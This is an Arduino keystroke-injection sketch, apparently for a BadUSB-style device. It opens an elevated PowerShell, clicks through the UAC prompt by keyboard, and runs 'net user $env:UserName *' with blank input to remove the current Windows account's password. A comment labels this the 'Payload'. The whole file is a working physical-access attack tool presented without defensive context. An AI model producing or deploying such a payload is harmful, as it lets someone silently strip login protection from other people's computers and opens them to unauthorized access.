#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  
  Keyboard.begin();

  delay(2500);
  
  // Minimize all apps

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(500);

  // Start powershell as admin

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell");

  delay(200);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();

  delay(150);

  typeKey(KEY_RETURN);

  delay(2000);
  
  // Disable windows password

  Keyboard.print("net user $env:UserName *");

  typeKey(KEY_RETURN);

  delay(150);

  typeKey(KEY_RETURN);

  delay(150);

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // End of Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
